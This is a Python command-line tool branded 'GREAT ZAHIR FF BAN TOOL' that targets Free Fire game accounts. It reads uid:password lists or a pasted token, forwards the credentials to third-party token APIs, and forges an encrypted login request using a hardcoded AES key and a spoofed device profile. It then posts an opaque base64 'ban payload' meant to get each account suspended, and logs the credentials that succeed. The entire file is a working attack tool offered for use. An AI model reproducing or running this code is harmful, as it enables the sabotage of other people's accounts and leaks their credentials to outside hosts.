#!/usr/bin/env python3
"""
GREAT ZAHIR FF BAN TOOL • PREMIUM EDITION • v2.2 (OB55)
Powered by GREAT ZAHIR
"""

import os
import sys
import json
import time
import base64
import threading
import requests
import urllib3
from datetime import datetime
import re

urllib3.disable_warnings()

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("\n[!] Install pycryptodome: pip install pycryptodome")
    sys.exit(1)

try:
    import MajoRLogin_pb2 as mLpB
    import MajorLoginRes_pb2 as mLrPb
except ImportError:
    print("\n[!] Protobuf files missing (MajoRLogin_pb2.py / MajorLoginRes_pb2.py).")
    sys.exit(1)

# ============================================================
# CONSTANTS (OB55)
# ============================================================

API_URL = 'https://clientbp.ppmainecoonghj.com/GetLoginData'
BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)
AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV = b'6oyZDr22E3ychjM%'
mLuRl = "https://loginbp.ppmainecoonghj.com/MajorLogin"
mLhDr = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-GA": "v1 1",
    "X-Unity-Version": "2018.4.11f1",
    "ReleaseVersion": "OB55"
}

# ============================================================
# BACKEND
# ============================================================

def decode_ff_name(b64_str):
    try:
        if not b64_str:
            return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            decrypted_bytes.append(byte ^ key[i % len(key)])
        name = decrypted_bytes.decode('utf-8', errors='ignore')
        return name if name else "Unknown"
    except:
        return "Unknown"

def enc(d):
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))

def dec(d):
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def build_majorlogin(tok, open_id, p_type):
    m = mLpB.MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.132.3"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())

def get_jwt_from_uid_pass(uid, password):
    apis = [
        f"https://great-zahir-jwt.vercel.app/token?uid={uid}&password={password}",
        f"https://ags-community-jwt-api.vercel.app/token?uid={uid}&password={password}",
    ]
    for url in apis:
        try:
            domain = url.split('/')[2]
            print(f"    {Color.dim}▸ trying {domain}{Color.reset}")
            r = requests.get(url, timeout=15, verify=False)
            if r.status_code == 200:
                data = r.json()
                tok = data.get("token") or data.get("access_token") or data.get("jwt")
                if tok:
                    print(f"    {Color.bright_gold}▸ token from {domain}{Color.reset}")
                    return tok, None
                else:
                    print(f"    {Color.red}▸ no token in {domain}: {str(data)[:80]}{Color.reset}")
            else:
                print(f"    {Color.red}▸ {domain} HTTP {r.status_code}{Color.reset}")
        except Exception as e:
            print(f"    {Color.red}▸ {domain} error: {e}{Color.reset}")
            continue
    return None, "Both JWT APIs failed"

def fetch_majorlogin_jwt(tok):
    """tok = JWT (ey...) or hex access_token. Returns (jwt, err)."""
    if not tok:
        return None, "Empty token"

    if tok.startswith("ey") and tok.count(".") == 2:
        return tok, None

    oId = None
    try:
        r = requests.get(
            f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}",
            headers={"User-Agent": "Mozilla/5.0"}, timeout=8
        ).json()
        oId = r.get("open_id")
    except:
        pass

    if not oId:
        try:
            uid_res = requests.get(
                "https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/",
                headers={"access-token": tok, "user-agent": "Mozilla/5.0"},
                verify=False, timeout=8
            ).json()
            uid = uid_res.get("uid")
            if uid:
                openid_res = requests.post(
                    "https://topup.pk/api/auth/player_id_login",
                    headers={"Content-Type": "application/json"},
                    json={"app_id": 100067, "login_id": str(uid)},
                    verify=False, timeout=8
                ).json()
                oId = openid_res.get("open_id")
        except:
            pass

    if not oId:
        return None, "Open ID extract failed (invalid/expired token)"

    for p_type in [8, 3, 4, 6]:
        try:
            pl = build_majorlogin(tok, oId, p_type)
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=12, verify=False)
            if x.status_code == 200:
                res = mLrPb.MajorLoginRes()
                try:
                    res.ParseFromString(dec(x.content))
                except:
                    res.ParseFromString(x.content)
                if res.token:
                    return res.token, None
        except:
            continue
    return None, "MajorLogin failed (blocked/mismatch)"

def decode_jwt(token):
    try:
        p = token.split('.')[1]
        p += "=" * ((4 - len(p) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(p).decode('utf-8'))
    except:
        return {}

def trigger_injection(jwt_token, version):
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': 'OB55',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(API_URL, headers=headers, data=body, timeout=25, verify=False)

# ============================================================
# LOADERS
# ============================================================

def load_accounts(file_path):
    if not os.path.isfile(file_path):
        return None, f"File not found: {file_path}"
    try:
        with open(file_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
            content = f.read().strip()
    except Exception as e:
        return None, f"Read error: {e}"
    if not content:
        return None, "File is empty"

    accounts = []

    def add(uid, pw):
        uid = str(uid).strip()
        pw = str(pw).strip()
        if uid and pw and not uid.lower().startswith(('access_token', 'open_id', 'name')):
            accounts.append({'uid': uid, 'password': pw, 'raw': f"{uid}:{pw}"})

    is_json = file_path.lower().endswith('.json') or content[0] in '[{'

    if is_json:
        try:
            data = json.loads(content)
        except json.JSONDecodeError as e:
            return None, f"Invalid JSON: {e}"

        if isinstance(data, dict):
            lk = {k.lower() for k in data}
            if 'uid' in lk and ('password' in lk or 'pass' in lk):
                add(data.get('uid', ''), data.get('password', data.get('pass', '')))
            else:
                for k, v in data.items():
                    add(k, v)
        elif isinstance(data, list):
            for entry in data:
                if isinstance(entry, str):
                    if ':' in entry:
                        u, p = entry.split(':', 1)
                        add(u, p)
                elif isinstance(entry, dict):
                    uid = (entry.get('uid') or entry.get('user_id')
                           or entry.get('account_id') or entry.get('id') or '')
                    pw = (entry.get('password') or entry.get('pass')
                          or entry.get('pw') or entry.get('passwd') or '')
                    add(uid, pw)

        if not accounts:
            return None, "No valid uid:password pairs in JSON"
        return accounts, None

    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if ':' in line:
            u, p = line.split(':', 1)
            add(u, p)

    if not accounts:
        return None, "No valid uid:password lines in text file"
    return accounts, None

def resolve_jwt(acc):
    uid = acc.get('uid', '')
    pw = acc.get('password', '')
    display = uid or 'unknown'
    if not uid or not pw:
        return None, "Missing uid or password", display
    guest_tok, err = get_jwt_from_uid_pass(uid, pw)
    if not guest_tok:
        return None, f"JWT API: {err}", display
    jwt_tok, err2 = fetch_majorlogin_jwt(guest_tok)
    return jwt_tok, err2, display

# ============================================================
# UI
# ============================================================

class Color:
    red = "\033[1;31m"
    gold = "\033[1;33m"
    bright_red = "\033[38;2;220;20;20m"
    bright_gold = "\033[38;2;255;215;0m"
    white = "\033[1;37m"
    reset = "\033[0m"
    bold = "\033[1m"
    dim = "\033[2m"

    @staticmethod
    def rgb(r, g, b):
        return f"\033[38;2;{r};{g};{b}m"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def visual_len(s):
    clean = re.sub(r'\x1b\[[0-9;]*m', '', s)
    total = 0
    for c in clean:
        cp = ord(c)
        if cp >= 0x1100 and (cp <= 0x115F or 0x2600 <= cp <= 0x27BF
                             or 0x2E80 <= cp <= 0xA4CF
                             or 0x1F300 <= cp <= 0x1F9FF
                             or 0x2580 <= cp <= 0x259F):
            total += 2
        else:
            total += 1
    return total

def print_big_box(lines, title=None, border_color=Color.bright_red,
                  title_color=Color.bright_gold, min_width=82):
    clean = [re.sub(r'\x1b\[[0-9;]*m', '', l) for l in lines] or [""]
    max_len = max(visual_len(l) for l in clean)
    if title:
        max_len = max(max_len, visual_len(title) + 6)
    box_w = max(min_width, max_len + 10)
    box_w = min(box_w, 130)

    print(border_color + "╔" + "═" * (box_w - 2) + "╗" + Color.reset)
    if title:
        t = f"  {title}  "
        pad = box_w - 2 - visual_len(t)
        left = pad // 2
        right = pad - left
        print(f"{border_color}║{Color.reset}{' ' * left}{title_color}{t}{Color.reset}{' ' * right}{border_color}║{Color.reset}")
        print(border_color + "╠" + "═" * (box_w - 2) + "╣" + Color.reset)
    for line in lines:
        pad = box_w - 2 - visual_len(line) - 4
        if pad < 0:
            pad = 0
        print(f"{border_color}║{Color.reset}    {line}{' ' * pad}    {border_color}║{Color.reset}")
    print(border_color + "╚" + "═" * (box_w - 2) + "╝" + Color.reset)

def spinner_animation(message, func, style='⣾⣽⣻⢿⡿⣟⣯⣷'):
    idx = 0
    result = {"data": None, "error": None}

    def worker():
        try:
            result["data"] = func()
        except Exception as e:
            result["error"] = e

    t = threading.Thread(target=worker, daemon=True)
    t.start()

    start = time.time()
    while t.is_alive():
        spin = style[idx % len(style)]
        prog = (time.time() - start) % 2 / 2
        r = int(139 + (255 - 139) * prog)
        g = int(0 + (215 - 0) * prog)
        sys.stdout.write(f"\r  {Color.rgb(r, g, 0)}{spin}{Color.reset} {Color.bold}{message}{Color.reset}…")
        sys.stdout.flush()
        time.sleep(0.1)
        idx += 1

    sys.stdout.write("\r" + " " * (visual_len(message) + 15) + "\r")
    sys.stdout.flush()

    if result["error"]:
        print(f"  {Color.bright_red}✖ {message}: {result['error']}{Color.reset}")
        raise result["error"]
    print(f"  {Color.bright_gold}✔ {message}{Color.reset}")
    return result["data"]

def premium_loading(message="Initializing", duration=2.0):
    bar_length = 60
    start = time.time()
    while True:
        elapsed = time.time() - start
        prog = min(elapsed / duration, 1.0)
        pct = int(prog * 100)
        filled = int(prog * bar_length)
        bar = '█' * filled + '░' * (bar_length - filled)
        r = int(139 + (255 - 139) * prog)
        g = int(0 + (215 - 0) * prog)
        sys.stdout.write(f"\r{Color.rgb(r, g, 0)}{bar}{Color.reset} {pct:3d}% {message}…")
        sys.stdout.flush()
        if prog >= 1.0:
            sys.stdout.write(f"\r{Color.bright_gold}{'█' * bar_length}{Color.reset} 100% {message}… {Color.bright_gold}✔ Ready!{Color.reset}\n")
            sys.stdout.flush()
            break
        time.sleep(0.04)

def print_header():
    gold = Color.bright_gold
    red = Color.bright_red
    w = 82

    def row(text=""):
        pad = w - 2 - visual_len(text) - 4
        return f"{red}║{Color.reset}    {text}{' ' * max(pad, 0)}    {red}║{Color.reset}"

    print()
    print(f"{red}╔{'═' * (w - 2)}╗{Color.reset}")
    print(row())
    print(row(f"{gold}{Color.bold} ██████╗ ██████╗ ███████╗ █████╗ ████████╗    ███████╗ █████╗ ██╗  ██╗██╗██████╗ {Color.reset}"))
    print(row(f"{gold}{Color.bold}██╔════╝ ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝    ╚══███╔╝██╔══██╗██║  ██║██║██╔══██╗{Color.reset}"))
    print(row(f"{gold}{Color.bold}██║  ███╗██████╔╝█████╗  ███████║   ██║         ███╔╝ ███████║███████║██║██████╔╝{Color.reset}"))
    print(row(f"{gold}{Color.bold}██║   ██║██╔══██╗██╔══╝  ██╔══██║   ██║        ███╔╝  ██╔══██║██╔══██║██║██╔══██╗{Color.reset}"))
    print(row(f"{gold}{Color.bold}╚██████╔╝██║  ██║███████╗██║  ██║   ██║       ███████╗██║  ██║██║  ██║██║██║  ██║{Color.reset}"))
    print(row(f"{gold}{Color.bold} ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝       ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝{Color.reset}"))
    print(row())
    print(f"{red}╠{'═' * (w - 2)}╣{Color.reset}")
    print(row())
    print(row(f"{red}🔥  P R E M I U M   E D I T I O N   •   v 2 . 2   •   O B 5 5  🔥{Color.reset}"))
    print(row(f"{gold}⚡   P O W E R E D   B Y   G R E A T   Z A H I R   ⚡{Color.reset}"))
    print(row())
    print(f"{red}╚{'═' * (w - 2)}╝{Color.reset}")
    print()

def print_menu():
    print_big_box(
        [
            f"{Color.bright_gold}[1]{Color.reset}  📂  Ban from file   (uid:password .json / .txt)",
            f"{Color.bright_gold}[2]{Color.reset}  🔑  Ban direct token (JWT or access_token)",
            f"{Color.bright_gold}[0]{Color.reset}  🚪  Exit",
        ],
        title=" ⚡ MAIN MENU ⚡ ",
        border_color=Color.bright_red, title_color=Color.bright_gold,
    )
    print(f"{Color.bright_gold}{Color.bold}➜ {Color.reset}", end="")

def print_file_prompt():
    w = 82
    red = Color.bright_red
    print(f"{red}╔{'═' * (w - 2)}╗{Color.reset}")
    for txt in (
        "📂  ENTER PATH TO ACCOUNT FILE (.json or .txt)",
        "👉  JSON format:  [ { \"uid\": \"...\", \"password\": \"...\" } ]",
        "👉  TXT format :  uid:password   (one per line)",
    ):
        pad = w - 2 - visual_len(txt) - 4
        print(f"{red}║{Color.reset}    {Color.bright_gold}{txt}{Color.reset}{' ' * max(pad, 0)}    {red}║{Color.reset}")
    print(f"{red}╚{'═' * (w - 2)}╝{Color.reset}")
    print(f"{Color.bright_gold}{Color.bold}➜ {Color.reset}", end="")

def print_token_prompt():
    w = 82
    red = Color.bright_red
    print(f"{red}╔{'═' * (w - 2)}╗{Color.reset}")
    for txt in (
        "🔑  PASTE JWT TOKEN  (eyJ...)  OR  ACCESS TOKEN (hex)",
        "👉  Press ENTER on empty line to cancel",
    ):
        pad = w - 2 - visual_len(txt) - 4
        print(f"{red}║{Color.reset}    {Color.bright_gold}{txt}{Color.reset}{' ' * max(pad, 0)}    {red}║{Color.reset}")
    print(f"{red}╚{'═' * (w - 2)}╝{Color.reset}")
    print(f"{Color.bright_gold}{Color.bold}➜ {Color.reset}", end="")

# ============================================================
# BAN ACTIONS
# ============================================================

def _ban_one(jwt_tok):
    """Given a resolved JWT, decode, show info, inject, return (nick, acc_id, resp)."""
    user = decode_jwt(jwt_tok)
    nick = decode_ff_name(user.get('nickname', ''))
    acc_id = user.get('account_id', 'Unknown')
    ver = user.get('release_version', 'OB55')

    print_big_box(
        [
            f"{Color.bright_gold}◈ Name    : {Color.bold}{nick}{Color.reset}",
            f"{Color.bright_gold}◈ UID     : {acc_id}{Color.reset}",
            f"{Color.bright_gold}◈ Region  : {user.get('lock_region', 'N/A')}{Color.reset}",
            f"{Color.bright_gold}◈ Version : {ver}{Color.reset}",
        ],
        title=" TARGET INFO ",
    )

    resp = spinner_animation(
        "Injecting ban payload",
        lambda: trigger_injection(jwt_tok, ver),
        style='◐◓◑◒',
    )
    return nick, acc_id, resp

def ban_from_file(file_path):
    accounts, err = load_accounts(file_path)
    if err:
        print_big_box([f"{Color.bright_red}✖ {err}{Color.reset}"], title=" FILE ERROR ")
        return

    total = len(accounts)
    print_big_box(
        [
            f"{Color.bright_gold}◈ Total Accounts : {Color.bold}{total}{Color.reset}",
            f"{Color.bright_gold}◈ Source File    : {file_path}{Color.reset}",
        ],
        title=" LOADED ",
    )

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    success_file = f"success_ban_{ts}.txt"
    failed_file = f"failed_ban_{ts}.txt"
    ok, fail = 0, 0

    for idx, acc in enumerate(accounts, 1):
        print()
        print_big_box(
            [
                f"{Color.bright_gold}Progress : {idx}/{total}{Color.reset}",
                f"{Color.bright_gold}Account  : {acc['raw']}{Color.reset}",
            ],
            title=" ▶ PROCESSING ",
        )
        try:
            jwt_tok, auth_err, tag = spinner_animation(
                f"Authenticating {acc['uid']}",
                lambda a=acc: resolve_jwt(a),
            )
            if not jwt_tok:
                raise Exception(auth_err or "Auth failed")

            nick, acc_id, resp = _ban_one(jwt_tok)

            if resp.status_code == 200:
                print_big_box(
                    [
                        f"{Color.bright_gold}✔ Account : {nick} ({acc_id}){Color.reset}",
                        f"{Color.bright_gold}✔ Status  : SUSPENDED{Color.reset}",
                    ],
                    title=" ✔ SUCCESS ", border_color=Color.bright_gold,
                )
                with open(success_file, 'a', encoding='utf-8') as sf:
                    sf.write(f"{acc['raw']}  # {nick} ({acc_id})\n")
                ok += 1
            else:
                raise Exception(f"HTTP {resp.status_code}")
        except Exception as e:
            print_big_box([f"{Color.bright_red}✖ Reason : {e}{Color.reset}"], title=" ✖ FAILED ")
            with open(failed_file, 'a', encoding='utf-8') as ff:
                ff.write(f"{acc['raw']}  # {e}\n")
            fail += 1

    print()
    print_big_box(
        [
            f"{Color.bright_gold}✔ Success : {Color.bold}{ok}{Color.reset}",
            f"{Color.bright_red}✖ Failed  : {Color.bold}{fail}{Color.reset}",
            f"{Color.bright_gold}📁 Success log : {success_file}{Color.reset}",
            f"{Color.bright_red}📁 Failed log  : {failed_file}{Color.reset}",
        ],
        title=" ⚡ FINAL RESULT ⚡ ", border_color=Color.bright_gold,
    )

def ban_direct_token(token):
    """Ban using a raw JWT or hex access_token."""
    token = token.strip()
    if not token:
        print(Color.bright_red + "  ✖ Token empty." + Color.reset)
        return

    # Detect type
    if token.startswith("ey") and token.count(".") == 2:
        print_big_box([f"{Color.bright_gold}◈ Detected : JWT token{Color.reset}"],
                      title=" TOKEN TYPE ")
    elif re.fullmatch(r'[A-Fa-f0-9]{32,}', token):
        print_big_box([f"{Color.bright_gold}◈ Detected : Hex access_token{Color.reset}"],
                      title=" TOKEN TYPE ")
    else:
        print_big_box([f"{Color.bright_red}◈ Unknown token format{Color.reset}",
                       f"{Color.dim}Use JWT (ey...) or hex access token{Color.reset}"],
                      title=" TOKEN TYPE ")
        return

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    success_file = f"success_token_{ts}.txt"
    failed_file = f"failed_token_{ts}.txt"

    try:
        jwt_tok, err = spinner_animation(
            "Resolving token",
            lambda: fetch_majorlogin_jwt(token),
        )
        if not jwt_tok:
            raise Exception(err or "Token resolve failed")

        nick, acc_id, resp = _ban_one(jwt_tok)

        if resp.status_code == 200:
            print_big_box(
                [
                    f"{Color.bright_gold}✔ Account : {nick} ({acc_id}){Color.reset}",
                    f"{Color.bright_gold}✔ Status  : SUSPENDED{Color.reset}",
                ],
                title=" ✔ SUCCESS ", border_color=Color.bright_gold,
            )
            with open(success_file, 'a', encoding='utf-8') as sf:
                sf.write(f"{token[:16]}…  # {nick} ({acc_id})\n")
        else:
            raise Exception(f"HTTP {resp.status_code}")

    except Exception as e:
        print_big_box([f"{Color.bright_red}✖ Reason : {e}{Color.reset}"], title=" ✖ FAILED ")
        with open(failed_file, 'a', encoding='utf-8') as ff:
            ff.write(f"{token[:16]}…  # {e}\n")

# ============================================================
# MAIN
# ============================================================

def main():
    clear()
    print_header()
    premium_loading("Initializing Great Zahir Core", duration=2.0)

    while True:
        print()
        print_menu()
        choice = input().strip()

        if choice == '0' or choice.upper() in ('Q', 'EXIT', 'QUIT'):
            print(Color.dim + "\n  Goodbye — Great Zahir\n" + Color.reset)
            sys.exit(0)

        if choice == '1':
            print()
            print_file_prompt()
            path = input().strip()
            if not path:
                print(Color.bright_red + "  ✖ Path empty." + Color.reset)
                continue
            try:
                ban_from_file(path)
            except Exception as e:
                print(Color.bright_red + f"  ✖ Error: {e}" + Color.reset)

        elif choice == '2':
            print()
            print_token_prompt()
            token = input().strip()
            if not token:
                print(Color.dim + "  Cancelled." + Color.reset)
                continue
            try:
                ban_direct_token(token)
            except Exception as e:
                print(Color.bright_red + f"  ✖ Error: {e}" + Color.reset)

        else:
            print(Color.bright_red + "  ✖ Invalid choice." + Color.reset)
            continue

        print()
        input(Color.dim + "  ENTER to return to menu…" + Color.reset)
        clear()
        print_header()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        clear()
        print(f"\n{Color.bright_red}⛔ Interrupted{Color.reset}")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n{Color.bright_red}⛔ Fatal: {e}{Color.reset}")
        sys.exit(1)